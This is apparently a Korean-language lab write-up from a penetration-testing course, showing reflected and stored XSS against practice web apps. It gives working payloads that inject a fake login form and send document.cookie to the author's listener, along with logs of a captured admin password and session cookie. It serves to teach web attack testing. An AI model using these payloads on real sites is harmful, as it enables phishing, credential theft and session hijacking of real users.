---
title: "XSS - XSS Attacks"
date: 2026-07-05
layout: single
excerpt: "Reflected XSS를 이용한 피싱 로그인 폼 삽입과 Stored XSS를 통한 관리자 쿠키 탈취 과정을 실습으로 정리한다."
author_profile: true
toc: true
toc_label: "XSS"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, xss]
---

**Reflected XSS**를 이용한 피싱 로그인 폼 삽입과 **Stored XSS**를 통한 관리자 쿠키 탈취 과정을 실습으로 정리한다.

# XSS Phishing

내부 웹페이지의 `/phishing` 디렉터리로 이동하면 다음과 같은 URL 입력란이 존재한다:

![XSS](/assets/cpts-web/xss-attacks/xss1.png)

먼저 로컬에서 Python HTTP 서버를 실행하였다:

```bash
$ python3 -m http.server 8000
```

URL 입력란에 다음과 같이 내 서버의 이미지 경로를 입력하였다:

```text
http://10.10.15.3:8000/image.png
```

이처럼 대상 페이지에서 해당 URL로 요청을 보냈다는 사실을 확인할 수 있다:

```text
10.10.15.3 - - [05/Jul/2026 00:33:34] code 404, message File not found
10.10.15.3 - - [05/Jul/2026 00:33:34] "GET /image.png HTTP/1.1" 404 -
```

## Analyzing the HTML Injection Point

Burp Suite를 실행한 뒤, URL 입력값이 HTML 내부에서 어떤 방식으로 처리되는지 확인하기 위해 다시 URL을 입력하였다.

그 결과 입력값이 `<img>` 태그의 `src` 속성에 삽입되는 것을 확인할 수 있었다:

![XSS](/assets/cpts-web/xss-attacks/xss2.png)

따라서 입력값 안에서 작은따옴표와 닫는 꺾쇠를 사용하면 기존 `src` 속성과 `<img>` 태그를 종료하고, 새로운 HTML 태그를 삽입할 수 있다.

다음과 같은 페이로드를 입력하였다:

```text
http://10.10.15.3:8000/image.png'><script>alert("test")</script>
```

서버가 응답으로 생성한 HTML은 다음과 같은 형태가 된다:

![XSS](/assets/cpts-web/xss-attacks/xss3.png)

기존 `<img>` 태그를 종료한 뒤 새로운 `<script>` 태그가 삽입되었으며, 브라우저에서 `alert("test")` 가 실행되는 것을 확인할 수 있었다.

이를 통해 URL 입력란에 **Reflected XSS** 취약점이 존재한다는 사실을 확인하였다.

## Login Form Injection

확인한 XSS 취약점을 이용해 페이지에 로그인 폼을 삽입하였다.

URL 입력란에 다음 페이로드를 삽입하였다:

```html
http://10.10.15.3:8000/image.png'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.15.3:8000><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

`document.write()` 를 사용해 새로운 로그인 폼을 페이지에 작성한다.

삽입되는 폼의 구조는 다음과 같다:

```html
<h3>Please login to continue</h3>

<form action="http://10.10.15.3:8000">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

페이로드가 실행되면 다음과 같이 사용자 이름과 비밀번호를 입력할 수 있는 로그인 폼이 표시된다:

![XSS](/assets/cpts-web/xss-attacks/xss4.png)

로그인 폼의 `action` 속성은 내 HTTP 서버를 가리키고 있으므로, 사용자가 폼을 제출하면 입력값이 내 서버로 전송된다.

위 폼 링크를 XSS 페이로드가 포함된 URL을 실습 환경의 관리자에게 전달하였다.

관리자가 로그인 폼에 자격 증명을 입력하고 Login 버튼을 누르면, 사용자 이름과 비밀번호가 URL 파라미터에 포함되어 내 HTTP 서버로 전송된다:

```text
10.129.123.243 - - [05/Jul/2026 00:54:32] code 404, message File not found
10.129.123.243 - - [05/Jul/2026 00:54:32] "GET /image.png HTTP/1.1" 404 -
10.129.123.243 - - [05/Jul/2026 00:54:32] "GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1" 200 -
```

# Session Hijacking

다음 웹사이트에는 사용자 등록 페이지가 존재한다:

![XSS](/assets/cpts-web/xss-attacks/xss5.png)

먼저 로컬에서 Python HTTP 서버를 실행하였다:

```bash
$ python3 -m http.server 8000
```

`Profile Picture URL` 입력란이 어떻게 처리되는지 확인하기 위해 다음 값을 입력하였다.

```text
Full Name           : test
Username            : test
Password            : test
E-Mail              : test@test.com
Profile Picture URL : http://10.10.15.3:8000/image.png
```

`Register` 버튼을 누르면 다음과 같은 메시지가 표시된다:

![XSS](/assets/cpts-web/xss-attacks/xss6.png)

즉, 등록 요청이 즉시 처리되는 것이 아니라 관리자가 해당 요청을 검토하는 구조이다.

잠시 후 로컬 HTTP 서버에서 다음 요청을 확인할 수 있었다:

```text
10.129.234.166 - - [05/Jul/2026 01:44:08] code 404, message File not found
10.129.234.166 - - [05/Jul/2026 01:44:08] "GET /image.png HTTP/1.1" 404 -
```

이는 관리자가 등록 요청을 확인할 때 `Profile Picture URL` 에 입력한 주소가 이미지 경로로 사용되었음을 의미한다.

## Testing Stored XSS

관리자의 브라우저에서 JavaScript가 실행되는지 확인하기 위해 `Profile Picture URL` 입력란에 다음 페이로드를 삽입하였다:

```html
http://10.10.15.3:8000/image.png"><script>new Image().src='http://10.10.15.3:8000/?c='+window.origin;</script>
```

그 결과 다음과 같은 요청을 확인할 수 있었다:

```text
10.129.234.166 - - [05/Jul/2026 01:49:11] code 404, message File not found
10.129.234.166 - - [05/Jul/2026 01:52:13] "GET /?c=http://127.0.0.1 HTTP/1.1" 200 -
```

이를 통해 등록 요청을 검토하는 관리자 페이지에서 저장된 XSS 페이로드가 정상적으로 실행된다는 사실을 확인하였다.

## Cookie Exfiltration

JavaScript가 실행되는 것을 확인했으므로, 다음으로 `document.cookie` 의 값을 전송하는 페이로드를 삽입하였다:

```html
http://10.10.15.3:8000/image.png"><script>new Image().src='http://10.10.15.3:8000/?c='+document.cookie;</script>
```

페이로드가 실행되면 `document.cookie` 의 값이 `c` 파라미터에 포함되어 내 HTTP 서버로 전송된다:

```text
10.129.234.166 - - [05/Jul/2026 02:00:09] "GET /image.png HTTP/1.1" 404 -
10.129.234.166 - - [05/Jul/2026 02:00:10] "GET /?c=cookie=c00k1355h0u1d8353cu23d HTTP/1.1" 200 -
```

이처럼 최종적으로 관리자 쿠키를 탈취하는 데 성공하였다.